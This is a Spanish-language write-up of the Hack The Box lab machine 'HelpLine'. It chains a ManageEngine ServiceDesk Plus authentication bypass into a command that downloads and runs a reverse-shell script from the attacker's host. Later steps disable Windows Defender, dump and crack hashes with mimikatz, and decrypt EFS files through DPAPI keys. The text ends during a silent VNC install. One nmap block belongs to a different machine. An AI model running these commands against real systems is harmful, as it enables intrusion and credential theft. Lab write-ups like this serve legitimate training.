---
layout: post
title: HelpLine
date: 2023-01-30
description:
img:
fig-caption:
tags: [ eWPT, OSCP]
---
___

<center><img src="/writeups/assets/img/Helpline-htb/Helpline_banner.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Abuso de ManageEngine ServiceDesk Plus

* Inhabilitación de Windows Defender

* Dumpeo de hashes NTLM con Mimikatz

* Information Disclosure

* Lectura de LOGs con PowerShell

* Obtención de certificados con Mimikatz

* Desencriptado de EFS con Mimikatz

* Creación de certificado PFX con opnessl

* Instalación de VNC (Sesión grafica interactiva Windows - No RDP)

* Conversión de SecureString a texto plano

* Uso de Runas para obtener una sesión como el usuario Administrador

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -sCV -p135,445,5985,8080,49667 10.10.10.132 -Pn -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-30 10:06 GMT
Nmap scan report for 10.10.10.132
Host is up (0.043s latency).

PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8080/tcp  open  http-proxy    -
|_http-server-header: -
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Set-Cookie: JSESSIONID=C419E57A9A15AA7889C23C87D7725BFE; Path=/; HttpOnly
|     Cache-Control: private
|     Expires: Thu, 01 Jan 1970 01:00:00 GMT
|     Content-Type: text/html;charset=UTF-8
|     Vary: Accept-Encoding
|     Date: Mon, 30 Jan 2023 10:06:15 GMT
|     Connection: close
|     Server: -
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <meta http-equiv="X-UA-Compatible" content="IE=Edge">
|     <script language='JavaScript' type="text/javascript" src='/scripts/Login.js?9309'></script>
|     <script language='JavaScript' type="text/javascript" src='/scripts/jquery-1.8.3.min.js'></script>
|     <link href="/style/loginstyle.css?9309" type="text/css" rel="stylesheet"/>
|     <link href="/style/new-classes.css?9309" type="text/css" rel="stylesheet">
|     <link href="/style/new-classes-sdp.css?9309" type="text/css" rel="stylesheet">
|     <link href="/style/conflict-fix.css?9309" type="text/css" rel="stylesheet">
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Set-Cookie: JSESSIONID=68D77A89826194832AFCAA1B87732311; Path=/; HttpOnly
|     Cache-Control: private
|     Expires: Thu, 01 Jan 1970 01:00:00 GMT
|     Content-Type: text/html;charset=UTF-8
|     Vary: Accept-Encoding
|     Date: Mon, 30 Jan 2023 10:06:17 GMT
|     Connection: close
|     Server: -
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <meta http-equiv="X-UA-Compatible" content="IE=Edge">
|     <script language='JavaScript' type="text/javascript" src='/scripts/Login.js?9309'></script>
|     <script language='JavaScript' type="text/javascript" src='/scripts/jquery-1.8.3.min.js'></script>
|     <link href="/style/loginstyle.css?9309" type="text/css" rel="stylesheet"/>
|     <link href="/style/new-classes.css?9309" type="text/css" rel="stylesheet">
|     <link href="/style/new-classes-sdp.css?9309" type="text/css" rel="stylesheet">
|_    <link href="/style/conflict-fix.css?9309" type="text/css" rel="stylesheet">
|_http-title: ManageEngine ServiceDesk Plus
49667/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.93%I=7%D=1/30%Time=63D79698%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,25D6,"HTTP/1\.1\x20200\x20OK\r\nSet-Cookie:\x20JSESSIONID=C419
SF:E57A9A15AA7889C23C87D7725BFE;\x20Path=/;\x20HttpOnly\r\nCache-Control:\
SF:x20private\r\nExpires:\x20Thu,\x2001\x20Jan\x201970\x2001:00:00\x20GMT\
SF:r\nContent-Type:\x20text/html;charset=UTF-8\r\nVary:\x20Accept-Encoding
SF:\r\nDate:\x20Mon,\x2030\x20Jan\x202023\x2010:06:15\x20GMT\r\nConnection
SF::\x20close\r\nServer:\x20-\r\n\r\n<!DOCTYPE\x20html>\n<html>\n<head>\n<
SF:meta\x20http-equiv=\"X-UA-Compatible\"\x20content=\"IE=Edge\">\n\n\n\n\
SF:r\n\n\x20\x20\x20\x20<script\x20language='JavaScript'\x20type=\"text/ja
SF:vascript\"\x20src='/scripts/Login\.js\?9309'></script>\n\x20\x20\x20\x2
SF:0<script\x20language='JavaScript'\x20type=\"text/javascript\"\x20src='/
SF:scripts/jquery-1\.8\.3\.min\.js'></script>\n\x20\x20\x20\x20\n\x20\x20\
SF:x20\x20<link\x20href=\"/style/loginstyle\.css\?9309\"\x20type=\"text/cs
SF:s\"\x20rel=\"stylesheet\"/>\n\x20\x20\x20\x20<link\x20href=\"/style/new
SF:-classes\.css\?9309\"\x20type=\"text/css\"\x20rel=\"stylesheet\">\n\x20
SF:\x20\x20\x20<link\x20href=\"/style/new-classes-sdp\.css\?9309\"\x20type
SF:=\"text/css\"\x20rel=\"stylesheet\">\n\x20\x20\x20\x20<link\x20href=\"/
SF:style/conflict-fix\.css\?9309\"\x20type=\"text/css\"\x20rel=\"styleshee
SF:t\">")%r(HTTPOptions,25D6,"HTTP/1\.1\x20200\x20OK\r\nSet-Cookie:\x20JSE
SF:SSIONID=68D77A89826194832AFCAA1B87732311;\x20Path=/;\x20HttpOnly\r\nCac
SF:he-Control:\x20private\r\nExpires:\x20Thu,\x2001\x20Jan\x201970\x2001:0
SF:0:00\x20GMT\r\nContent-Type:\x20text/html;charset=UTF-8\r\nVary:\x20Acc
SF:ept-Encoding\r\nDate:\x20Mon,\x2030\x20Jan\x202023\x2010:06:17\x20GMT\r
SF:\nConnection:\x20close\r\nServer:\x20-\r\n\r\n<!DOCTYPE\x20html>\n<html
SF:>\n<head>\n<meta\x20http-equiv=\"X-UA-Compatible\"\x20content=\"IE=Edge
SF:\">\n\n\n\n\r\n\n\x20\x20\x20\x20<script\x20language='JavaScript'\x20ty
SF:pe=\"text/javascript\"\x20src='/scripts/Login\.js\?9309'></script>\n\x2
SF:0\x20\x20\x20<script\x20language='JavaScript'\x20type=\"text/javascript
SF:\"\x20src='/scripts/jquery-1\.8\.3\.min\.js'></script>\n\x20\x20\x20\x2
SF:0\n\x20\x20\x20\x20<link\x20href=\"/style/loginstyle\.css\?9309\"\x20ty
SF:pe=\"text/css\"\x20rel=\"stylesheet\"/>\n\x20\x20\x20\x20<link\x20href=
SF:\"/style/new-classes\.css\?9309\"\x20type=\"text/css\"\x20rel=\"stylesh
SF:eet\">\n\x20\x20\x20\x20<link\x20href=\"/style/new-classes-sdp\.css\?93
SF:09\"\x20type=\"text/css\"\x20rel=\"stylesheet\">\n\x20\x20\x20\x20<link
SF:\x20href=\"/style/conflict-fix\.css\?9309\"\x20type=\"text/css\"\x20rel
SF:=\"stylesheet\">");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_clock-skew: -1s
| smb2-time: 
|   date: 2023-01-30T10:07:51
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 142.25 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p22,53,88,3128 10.10.10.224 -Pn
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-18 16:30 GMT
Nmap scan report for 10.10.10.224
Host is up (0.045s latency).

PORT     STATE SERVICE      VERSION
22/tcp   open  ssh          OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 8ddd1810e57bb0daa3fa1437a7527a9c (RSA)
|   256 f6a92e57f818b6f4ee0341271e1f9399 (ECDSA)
|_  256 0474dd6879f42278d8cedd8b3e8c763b (ED25519)
53/tcp   open  domain       ISC BIND 9.11.20 (RedHat Enterprise Linux 8)
| dns-nsid: 
|_  bind.version: 9.11.20-RedHat-9.11.20-5.el8
88/tcp   open  kerberos-sec MIT Kerberos (server time: 2023-01-18 16:30:56Z)
3128/tcp open  http-proxy   Squid http proxy 4.11
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/4.11
Service Info: Host: REALCORP.HTB; OS: Linux; CPE: cpe:/o:redhat:enterprise_linux:8

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.12 seconds

```

Nmap reporta un dominio, por lo que para que resuelva, lo añado al etc/hosts

```null
echo '10.10.10.224 REALCORP.HTB' >> /etc/hosts
```

## Puerto 445 (SMB)

Con crackmapexex aplico un escaneo para ver el dominio, hostname y versiones

```null
crackmapexec smb 10.10.10.132
SMB         10.10.10.132    445    HELPLINE         [*] Windows 10.0 Build 17763 x64 (name:HELPLINE) (domain:HELPLINE) (signing:False) (SMBv1:False)
```

Pruebo a listar los recursos compartidos, pero no tengo acceso

```null
smbmap -H 10.10.10.132 -u 'null'
[!] Authentication error on 10.10.10.132
```

## Puerto 8080 (HTTP)

Con whatweb, analizo las tecnologías utilizadas en el servidor web

```null
whatweb http://10.10.10.132:8080
http://10.10.10.132:8080 [200 OK] Cookies[JSESSIONID], Country[RESERVED][ZZ], Frame, HTML5, HTTPServer[-], HttpOnly[JSESSIONID], IP[10.10.10.132], JQuery[1.8.3], Java, PasswordField[j_password], Script[text/JavaScript,text/javascript], Title[ManageEngine ServiceDesk Plus], X-UA-Compatible[IE=Edge]
```

Abro el navegador y veo su contenido:

<img src="/writeups/assets/img/Helpline-htb/1.png" alt="">

En la parte inferior derecha, aparece la versión de ManageEngine ServiceDesk Plus. Busco vulnerabilidades públicas asociadas a esta

```null
searchsploit ManageEngine ServiceDesk Plus
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                                                |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
ManageEngine ServiceDesk Plus 7.6 - woID SQL Injection                                                                                                                        | jsp/webapps/11793.txt
ManageEngine ServiceDesk Plus 8.0 - Directory Traversal                                                                                                                       | jsp/webapps/17437.txt
ManageEngine ServiceDesk Plus 8.0 - Multiple Persistent Cross-Site Scripting Vulnerabilities                                                                                  | jsp/webapps/17713.txt
ManageEngine ServiceDesk Plus 8.0 Build 8013 - Multiple Cross-Site Scripting Vulnerabilities                                                                                  | jsp/webapps/17586.txt
ManageEngine ServiceDesk Plus 8.0.0 Build 8013 - Improper User Privileges                                                                                                     | multiple/webapps/17572.txt
ManageEngine ServiceDesk Plus 8.1 - Persistent Cross-Site Scripting                                                                                                           | windows/webapps/20356.py
ManageEngine ServiceDesk Plus 9.0 - Authentication Bypass                                                                                                                     | java/webapps/42037.txt
ManageEngine ServiceDesk Plus 9.0 - SQL Injection                                                                                                                             | jsp/webapps/35890.txt
ManageEngine ServiceDesk Plus 9.0 - User Enumeration                                                                                                                          | jsp/webapps/35891.txt
ManageEngine ServiceDesk Plus 9.0 < Build 9031 - User Privileges Management                                                                                                   | jsp/webapps/35904.txt
ManageEngine ServiceDesk Plus 9.1 build 9110 - Directory Traversal                                                                                                            | jsp/webapps/38395.txt
ManageEngine ServiceDesk Plus 9.2 Build 9207 - Unauthorized Information Disclosure                                                                                            | java/webapps/40569.txt
ManageEngine ServiceDesk Plus 9.3 - User Enumeration                                                                                                                          | java/webapps/46674.txt
Zoho ManageEngine ServiceDesk Plus (SDP) < 10.0 build 10012 - Arbitrary File Upload                                                                                           | jsp/webapps/46413.txt
Zoho ManageEngine ServiceDesk Plus 9.3 - 'PurchaseRequest.do' Cross-Site Scripting                                                                                            | java/webapps/46966.txt
Zoho ManageEngine ServiceDesk Plus 9.3 - 'SearchN.do' Cross-Site Scripting                                                                                                    | java/webapps/46965.txt
Zoho ManageEngine ServiceDesk Plus 9.3 - 'SiteLookup.do' Cross-Site Scripting                                                                                                 | java/webapps/46963.txt
Zoho ManageEngine ServiceDesk Plus 9.3 - 'SolutionSearch.do' Cross-Site Scripting                                                                                             | java/webapps/46964.txt
Zoho ManageEngine ServiceDesk Plus 9.3 - Cross-Site Scripting                                                                                                                 | multiple/webapps/46895.txt
Zoho ManageEngine ServiceDesk Plus < 10.5 - Improper Access Restrictions                                                                                                      | multiple/webapps/46894.txt
Zoho ManageEngine ServiceDesk Plus MSP 9.4 - User Enumeration                                                                                                                 | java/webapps/50027.py
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results

```

Pero antes puedo probar a introducir credenciales típicas, como admin:admin; administrator:administrator; guest:guest, y puedo entrar como un usuario de invitado

<img src="/writeups/assets/img/Helpline-htb/2.png" alt="">


Uno de los explotis me indica la forma de convertirme en usuario Administrador sin disponer de sus credenciales

```null
searchsploit -x java/webapps/46674.txt

Steps to reproduce: These steps can also be used to exploit authentication to privilege escalate into a higher level account via authentication bypass. (More info about authentication can be found with CVE-2019-10008)

- Start with logging into the guest account on the login page http://examplesite.com:8080, this will allow the first set of authentication to take place. (An attacker can use the guest credentials, this can be any low level user, or even the default applications credentials, Username: guest Password:guest)
- Navigate to the mobile login form located at http://examplesite.com:8080/mc, you will see that you have automatically be authenticated with whichever account you decided to previously login with.
- Logout of the mobile form at http://examplesite.com:8080/mc

- Re-login with any username, and the application will see that you have already been authenticated and it will not require a valid password.
- If you are able to successfully be automatically authenticated, you can confirm that the user is an active user within the service.
- You may now intercept and capture the login request with Burp Suite to set up a bruteforce attack, the http://examplesite.com:8080/mc will not try and prevent a barrage of requests. There is no protection set up within the services application
```

Desde la sección de movil, cierro sesión

<img src="/writeups/assets/img/Helpline-htb/3.png" alt="">

Vuelvo a iniciar sesión pero desde este otro panel, probando de nuevo las credenciales administrator:administrator. Al volver a al raíz de la página web, estoy loggeado como este usuario.

<img src="/writeups/assets/img/Helpline-htb/4.png" alt="">

En la nueva interfaz, hay una sección de Administrador y dentro un campo que permite ejecutar un comando a la hora de crear o cerrar los tickets

<img src="/writeups/assets/img/Helpline-htb/5.png" alt="">

Creo una sentencia en powershell que me permita enviarme una reverse shell a través de Invoke-ConPtyShell.ps1 de nishang, en formato UTF-16le y base64. Comparto el script con python y me quedo en escucha por netcat

```null
echo 'IEX(New-Object Net.WebClient).downloadString("http://10.10.14.10/Invoke-ConPtyShell.ps1")' | iconv -t utf-16le | xclip -sel clip
```

Modifico el script para añadirle lo que se tiene que ejecutar una vez se interprete

```null
cat Invoke-ConPtyShell.ps1 | tail -n 1
Invoke-ConPtyShell -RemoteIp 10.10.14.10 -RemotePort 443 -Rows 55 -Cols 209
```

Creo una macro que se ejecute cuando el remitente no contenga una cadena de caracteres dada y envío el ticket

<img src="/writeups/assets/img/Helpline-htb/6.png" alt="">

<img src="/writeups/assets/img/Helpline-htb/7.png" alt="">

Gano acceso al sistema, como el usuario Administrador del Dominio. Pero no puedo ver ninguna de las flags

```null
PS C:\Users\Administrator\Desktop> type root.txt
type : Access to the path 'C:\Users\Administrator\Desktop\root.txt' is denied. 
At line:1 char:1
+ type root.txt
+ ~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Users\Administrator\Desktop\root.txt:String) [Get-Content], UnauthorizedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
 
```

Cuando debería tener acceso

```null
PS C:\Users\Administrator\Desktop> icacls root.txt
root.txt NT AUTHORITY\SYSTEM:(RX)
         HELPLINE\Administrator:(RX)
         BUILTIN\Administrators:(RX)

Successfully processed 1 files; Failed processing 0 files
```

La primera flag está encriptada y solo la puede leer tolu

```null
PS C:\Users\tolu\Desktop> cipher /c user.txt     

 Listing C:\Users\tolu\Desktop\
 New files added to this directory will not be encrypted.

E user.txt
  Compatibility Level:
    Windows XP/Server 2003

  Users who can decrypt:
    HELPLINE\tolu [tolu(tolu@HELPLINE)]
    Certificate thumbprint: 91EF 5D08 D1F7 C60A A0E4 CEE7 3E05 0639 A669 2F29 

  No recovery certificate found.

  Key information cannot be retrieved.

The specified file could not be decrypted.
```

En el directorio C:\Temp, hay un fichero con credenciales en texto claro, me puedo conectar, pero es un Rabbit Hole que no lleva a ningún lado

```null
PS C:\Temp\Password Audit> type .\it_logins.txt

local Windows account created 

username: alice
password: $sys4ops@megabank!
admin required: no

shadow admin accounts:

mike_adm:Password1 
dr_acc:dr_acc
```

Puedo tratar de dumpear el NTDS y dumpear la SAM para obtener los hashes NTLM de los usuarios. Me transfiero el mimikatz a la máquina víctima

```null
PS C:\Temp> iwr -uri http://10.10.14.10/mimikatz.exe -o mimikatz.exe
```

Si trato de ejecutarlo, el Defender lo bloquea

```null
PS C:\Windows\Temp> .\mimikatz.exe
Program 'mimikatz.exe' failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted softwareAt line:1 char:1 
+ .\mimikatz.exe
+ ~~~~~~~~~~~~~~.
At line:1 char:1
+ .\mimikatz.exe
+ ~~~~~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed
```

Como estoy como nt authoriy/system, lo puedo deshabilitar sin problema

```null
PS C:\Windows\Temp> Set-MpPreference -DisableRealtimeMonitoring $true
```

Y dumpeo la SAM

```null
PS C:\Windows\Temp> .\mimikatz.exe "privilege::debug" "lsadump::sam" "exit"
```

Me quedo únicamente con los hashes

```null
cat data | grep "NTLM:" | awk NF'{print $NF}'
d5312b245d641b3fae0d07493a022622
52a344a6229f7bfa074d3052023f0b41
998a9de69e883618e987080249d20253
eef285f4c800bcd1ae1e84c371eeb282
60b05a66232e2eb067b973c889b615dd
35a9de42e66dcdd5d512a796d03aef50
03e2ec7aa7e82e479be07ecd34f1603b
```

Y encuentra una contraseña

```null
john -w:/usr/share/wordlists/rockyou.txt hashes --format=NT
Using default input encoding: UTF-8
Loaded 7 password hashes with no different salts (NT [MD4 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
0987654321       (?)     
1g 0:00:00:00 DONE (2023-01-30 11:29) 1.694g/s 24311Kp/s 24311Kc/s 145869KC/s  _ 09..*7¡Vamos!
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed. 
```

Corresponde a zacharay

```null
RID  : 000003ef (1007)
User : zachary
  Hash NTLM: eef285f4c800bcd1ae1e84c371eeb282 
```

Podría intentar añadirlo al grupo Remote Management Users para poder conectarme con evil-winrm, pero esta acción solo se puede realizar desde el DC

```null
PS C:\Windows\Temp> net group add
This command can be used only on a Windows Domain Controller.

More help is available by typing NET HELPMSG 3515.
```

Está en un grupo llamado Event Log Readers

```null
PS C:\Windows\Temp> net user zachary
User name                    zachary
Full Name                    zachary
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            12/21/2018 9:25:34 PM
Password expires             Never
Password changeable          12/21/2018 9:25:34 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   12/28/2018 9:57:32 PM

Logon hours allowed          All

Local Group Memberships      *Event Log Readers    *Users
Global Group memberships     *None
The command completed successfully.
```

Podría tratar de listar los LOGs del Sistema, aunque directamente como nt authority\system. Utilizo un script disponible en [Github](https://raw.githubusercontent.com/RamblingCookieMonster/PowerShell/master/Get-WinEventData.ps1)

```null
wget https://raw.githubusercontent.com/RamblingCookieMonster/PowerShell/master/Get-WinEventData.ps1
```

Suponiendo que hay una tarea que se ejecuta en intervalos regulares de tiempo, podría intentar ver quien la ejecuta y cual es el proceso asociado. En Google busco por el ID correspondiente

<img src="/writeups/assets/img/Helpline-htb/8.png" alt="">

```null
PS C:\Windows\Temp> IEX(New-Object Net.WebClient).downloadString('http://10.10.14.10/Get-WinEventData.ps1')

PS C:\Windows\Temp> Get-WinEvent -FilterHashtable @{Logname='security';id=4688} -MaxEvents 10 | Get-WinEventData


   ProviderName: Microsoft-Windows-Security-Auditing

TimeCreated                     Id LevelDisplayName Message                                                                                                                                                      
-----------                     -- ---------------- -------                                                                                                                                                      
1/30/2023 9:52:15 AM          4688 Information      A new process has been created....                                                                                                                           
1/30/2023 9:52:15 AM          4688 Information      A new process has been created....                                                                                                                           
1/30/2023 9:52:15 AM          4688 Information      A new process has been created....                                                                                                                           
1/30/2023 9:52:15 AM          4688 Information      A new process has been created....                                                                                                                           
1/30/2023 9:52:15 AM          4688 Information      A new process has been created....                                                                                                                           
1/30/2023 9:52:15 AM          4688 Information      A new process has been created....                                                                                                                           
1/30/2023 9:52:15 AM          4688 Information      A new process has been created....                                                                                                                           
1/30/2023 9:52:14 AM          4688 Information      A new process has been created....                                                                                                                           
1/30/2023 9:52:12 AM          4688 Information      A new process has been created....                                                                                                                           
1/30/2023 9:52:11 AM          4688 Information      A new process has been created....                                                                                                                           
```

Por cada proceso que encuentre, únicamente me interesa quedarme con el comando que ha sido ejecutado

```null
Get-WinEvent -FilterHashtable @{Logname='security';id=4688} | Get-WinEventData | Select e_CommandLine | ft -AutoSize
```

Se leakea la contraseña del usuario tolu

```null
C:\Windows\system32\systeminfo.exe" /S \\helpline /U /USER:tolu /P !zaq1234567890pl!99
```

Pertenece al grupo Remote Management Users, así que me conecto por winrm. Pero sigo sin poder ver la flag

```null
evil-winrm -i 10.10.10.132 -u 'tolu' -p '!zaq1234567890pl!99'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\tolu\Documents> whoami
helpline\tolu
*Evil-WinRM* PS C:\Users\tolu\Documents> type C:\Users\tolu\Desktop\user.txt
Access to the path 'C:\Users\tolu\Desktop\user.txt' is denied.
At line:1 char:1
+ type C:\Users\tolu\Desktop\user.txt
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Users\tolu\Desktop\user.txt:String) [Get-Content], UnauthorizedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
*Evil-WinRM* PS C:\Users\tolu\Documents> 
```

A la hora de enfrentarse a un Encrypted File System, lo más importante no es acceder al sistema como el usuario propietario, si no poseer su credencial. Por eso no tiene sentido que le cambiara la contraseña.

En esta [Guía](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files) explican como realizar todo el proceso con mimikatz paso a paso

Con cipher puedo ver el thumprint asocidado para ese archivo

```null
PS C:\Users\tolu\Desktop> cipher /c user.txt

 Listing C:\Users\tolu\Desktop\
 New files added to this directory will not be encrypted.

E user.txt
  Compatibility Level:
    Windows XP/Server 2003

  Users who can decrypt:
    HELPLINE\tolu [tolu(tolu@HELPLINE)]
    Certificate thumbprint: 91EF 5D08 D1F7 C60A A0E4 CEE7 3E05 0639 A669 2F29 

  No recovery certificate found.

  Key information cannot be retrieved.

The specified file could not be decrypted.
```

Me dirijo a la ruta donde se encuentran los certificados de tolu

```null
PS C:\Users\tolu\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates> dir


    Directory: C:\Users\tolu\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a--s-       12/29/2018   9:21 PM           1038 91EF5D08D1F7C60AA0E4CEE73E050639A6692F29
```

Corresponde con el thumprint del fichero encriptado (user.txt)

Creo un archivo DER de ese thumprint y me lo transfiero al kali

```null
.\mimikatz.exe "crypto::system /file:C:\Users\tolu\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates\91EF5D08D1F7C60AA0E4CEE73E050639A6692F29 /export" "exit" 
```

Como ya tengo el certificado, puedo tratar de obtener la masterkey del archivo. Para ello, puedo recurrir a la ruta donde se almacena el backup, que está relacionada con el hash NTLM de cuando fue creado y, por tanto de la contraseña del usuario tolu

```null
PS C:\Users\tolu> cd AppData\Roaming\Microsoft\Protect\ 
PS C:\Users\tolu\AppData\Roaming\Microsoft\Protect> dir 


    Directory: C:\Users\tolu\AppData\Roaming\Microsoft\Protect


Mode                LastWriteTime         Length Name                                                                                                                                                            
----                -------------         ------ ----                                                                                                                                                            
d---s-       12/28/2018   9:56 PM                S-1-5-21-3107372852-1132949149-763516304-1011                                                                                                                   


PS C:\Users\tolu\AppData\Roaming\Microsoft\Protect> dir 


    Directory: C:\Users\tolu\AppData\Roaming\Microsoft\Protect


Mode                LastWriteTime         Length Name                                                                                                                                                            
----                -------------         ------ ----                                                                                                                                                            
d---s-       12/28/2018   9:56 PM                S-1-5-21-3107372852-1132949149-763516304-1011                                                                                                                   


PS C:\Users\tolu\AppData\Roaming\Microsoft\Protect> cd .\S-1-5-21-3107372852-1132949149-763516304-1011\ 
PS C:\Users\tolu\AppData\Roaming\Microsoft\Protect\S-1-5-21-3107372852-1132949149-763516304-1011> dir 
PS C:\Users\tolu\AppData\Roaming\Microsoft\Protect\S-1-5-21-3107372852-1132949149-763516304-1011> dir -force 


    Directory: C:\Users\tolu\AppData\Roaming\Microsoft\Protect\S-1-5-21-3107372852-1132949149-763516304-1011


Mode                LastWriteTime         Length Name                                                                                                                                                            
----                -------------         ------ ----                                                                                                                                                            
-a-hs-       12/28/2018   9:56 PM            468 2f452fc5-c6d2-4706-a4f7-1cd6b891c017                                                                                                                            
-a-hs-       12/28/2018   9:56 PM             24 Preferred                                                                                                                                                       


PS C:\Users\tolu\AppData\Roaming\Microsoft\Protect\S-1-5-21-3107372852-1132949149-763516304-1011> 
```

```null
PS C:\Windows\Temp> .\mimikatz.exe "dpapi::masterkey /in:C:\Users\tolu\AppData\Roaming\Microsoft\Protect\S-1-5-21-3107372852-1132949149-763516304-1011\2f452fc5-c6d2-4706-a4f7-1cd6b891c017 /password:!zaq1234567
890pl!99" "exit"
```

Al final del todo reporta la masterkey en SHA1

```null
[masterkey] with password: !zaq1234567890pl!99 (normal user)
  key : 1d0cea3fd8c42574c1a286e3938e6038d3ed370969317fb413b339f8699dcbf7f563b42b72ef45b394c61f73cc90c62076ea847f4c1e1fee3947f381d56d0f02
  sha1: 8ece5985210c26ecf3dd9c53a38fc58478100ccb
```

Ahora puedo desencriptar la clave privada, para poder exportarla

```null
PS C:\Windows\Temp> .\mimikatz.exe "dpapi::capi /in:C:\Users\tolu\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-3107372852-1132949149-763516304-1011\307da0c2172e73b4af3e45a97ef0755b_86f90bf3-9d4c-47b0-bc79-380
521b14c85 /masterkey:8ece5985210c26ecf3dd9c53a38fc58478100ccb" "exit"
```

La descargo a mi equipo y con openssl, puedo utilizarla para crear una clave pública.

```null
openssl x509 -inform DER -outform PEM -in 91EF5D08D1F7C60AA0E4CEE73E050639A6692F29.der -out public.pem
```

También necesito una clave privada, pero no la que ya tengo, si no una generada a partir de esta

```null
openssl rsa -inform PVK -outform PEM -in file.keyx.rsa.pvk -out private.pem
```

Solo falta crear un certificado, que en caso de instalarlo, podré ver el contenido del archivo

```null
openssl pkcs12 -in public.pem -inkey private.pem -password pass:mimikatz -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

Lo descargo en la máquina y con certutil lo incorporo

```null
PS C:\Windows\Temp> iwr -uri http://10.10.14.10/cert.pfx -o cert.pfx
PS C:\Windows\Temp> certutil -user -p mimikatz -importpfx cert.pfx NoChain,NoRoot
Certificate "tolu" added to store.

CertUtil: -importPFX command completed successfully.
```

Puedo ver la primera flag

```null
PS C:\Windows\Temp> type C:\Users\tolu\Desktop\user.txt 
0d522fa8d6d2671636ac7e73216808d3  
```

Dentro del escritorio de leo, hay un archivo con la contraseña del usuario administrador, que es el que puede desencriptar el root.txt, pero no puedo ver su contenido

```null
PS C:\Users\leo\Desktop> type .\admin-pass.xml
type : Access to the path 'C:\Users\leo\Desktop\admin-pass.xml' is denied. 
At line:1 char:1
+ type .\admin-pass.xml
+ ~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Users\leo\Desktop\admin-pass.xml:String) [Get-Content], UnauthorizedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
```

# Escalada

Al listar por las tareas que se ejecutan en ese momento, aparece que Leo tiene una sesión activa

```null
tasklist /v

....

powershell.exe                6032 Console                    1     79,624 K Unknown         HELPLINE\leo                                            0:00:13 N/A
```

Podría intentar instalar un software que se encargue de conectarme al escritorio remoto de este usuario. Voy a utilizar tightvnc.msi

Lo descargo de la [Web Oficial](https://www.tightvnc.com/download.php) y lo transfiero a la máquina víctima para instalarlo con el siguiente comando:

```null
PS C:\Windows\Temp> iwr -uri http://10.10.14.10/tightvnc.msi -o tightvnc.msi
PS C:\Windows\Temp> cmd /c msiexec /i tightvnc.msi /quiet /norestart ADDLOCAL="Server,Viewer" VIEWER_ASSOCIATE_VNC_EXTENSION=1 SERVER_REGISTER_AS_SERVICE=1 SERVER_ADD_FIREWALL_EXCEPTION=1 VIEWER_ADD_FIREWALL_E
XCEPTION=1 SERVER_ALLOW_SAS=1 SET_USEVNCAUTHENTICATION=1 VALUE_OF_USEVNCAUTHENTICATION=1 SET_PASSWORD=1 VALUE_OF_PASSWORD=PASSWORD SET_USECONTROLAUTHENTICATION=1 VALUE_OF_USECONTROLAUTHENTICATION=1 SET_CONTROL
PASSWORD=1 VALUE_OF_CONTROLPASSWORD=PASSWORD
```

Con nmap, compruebo que se ha abierto el puerto del servicio vnc

```null
